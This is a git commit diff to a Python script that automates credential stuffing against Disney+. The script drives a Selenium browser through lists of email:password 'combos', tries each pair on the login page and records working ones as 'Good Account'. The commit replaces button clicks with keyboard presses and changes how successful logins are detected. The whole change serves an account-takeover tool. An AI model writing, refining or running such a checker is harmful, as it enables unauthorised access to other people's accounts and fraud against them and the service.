d5e8e88eebbab1182e92b3ae1f28fe115a411f30
roberto <roberto@Debian.myguest.virtualbox.org>
2024-02-02 19:44:53 +0000

    fix: simplified elements, fixed successfull account detection

--- services/disney.py
+++ services/disney.py
@@ -6,6 +6,8 @@ from combo_splitters.split_combos import ComboSplitter
 from selenium.common.exceptions import NoSuchElementException
 from selenium.common.exceptions import ElementClickInterceptedException
 from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.chrome.options import Options
 from selenium import webdriver
 from pathlib import Path
@@ -34,7 +36,7 @@ def disney():
     while index != len(users):
         os.makedirs(plain_directory + '/accounts', exist_ok=True)
         with open(plain_directory + '/accounts/disney_acc', 'a') as account_results:
-            try:
+            #try:
                 print('\rTrying Combo {} out of {}'.format(index + 1, len(users)), end='')
                 browser = webdriver.Chrome(options=browser_options)
                 browser.set_window_size(200,200)
@@ -46,10 +48,11 @@ def disney():
                 email_input_box = browser.find_element(By.XPATH, '//*[@id="email"]')
                 email_input_box.send_keys(users[index])
                 time.sleep(2)
-                email_submit_button = browser.find_element(By.XPATH, '//*[@id="content"]/div/div/div/div['
-                                                                     '2]/div/div/div/form/button')
-                email_submit_button.click()
-                time.sleep(3)
+                action = ActionChains(browser)
+                email_input_box.send_keys(Keys.TAB)
+                time.sleep(1)
+                email_input_box.send_keys(Keys.ENTER)
+                time.sleep(6)
                 if browser.find_elements(By.XPATH, '//*[@id="app_index"]/div[3]/div/div'):
                     print(" | {}:{} ---> Invalid Email".format(users[index], passwords[index]))
                     iframe = True
@@ -60,27 +63,22 @@ def disney():
                     pass_input_box = browser.find_element(By.XPATH, '//*[@id="password"]')
                     pass_input_box.send_keys(passwords[index])
                     time.sleep(2)
-                    login_button = browser.find_element(By.XPATH, '//*[@id="content"]/div/div/div/div['
-                                                                  '2]/div/div/div/form/button')
-                    login_button.click()
+                    pass_input_box.send_keys(Keys.TAB)
+                    time.sleep(1)
+                    pass_input_box.send_keys(Keys.ENTER)
                     time.sleep(7)
                     login_process_complete = True
-                if 'https://www.disneyplus.com/identity/sign-up/create-password' in browser.current_url:
-                    print(" | {}:{} ---> Invalid Email".format(users[index], passwords[index]))
-                if browser.find_elements(By.XPATH, '//*[@id="section_index"]/div/div[2]/div/button'):
-                    print(" | {}:{} ---> Subscription Expired".format(users[index], passwords[index]))
-                if browser.find_elements(By.XPATH, '//*[@id="onboarding_index"]/div/div/form/h3'):
-                    two_factor_authentication = browser.find_element(By.XPATH, '//*[@id="onboarding_index"]/div/div/form/h3').text
-                    if 'Check your email inbox' in str(two_factor_authentication):
-                        print(" | {}:{} ---> Protected by Two-Factor Authentication".format(users[index],
-                                                                                            passwords[index]))
                 if login_process_complete:
                     time.sleep(10)
                     if browser.find_elements(By.XPATH, '//*[@id="password__error"]'):
                         print(" | {}:{} ---> Invalid Password".format(users[index], passwords[index]))
-                    if browser.find_elements(By.XPATH, '//*[@id="remove-main-padding_index"]/div/div/section') or 'home' in browser.current_url:
+                    elif browser.find_elements(By.XPATH, '//*[@id="remove-main-padding_index"]/div/div/section') or 'home' in browser.current_url:
                         print(" | {}:{} ---> Success!".format(users[index], passwords[index]))
                         account_results.write('{}:{} ---> Good Account\n'.format(users[index], passwords[index]))
+                    else:
+                        print(" | {}:{} ---> Invalid Account".format(users[index], passwords[index]))
+                else:
+                    print(" | {}:{} ---> Invalid Account".format(users[index], passwords[index]))
                 index += 1
                 iframe = False
                 login_process_complete = False
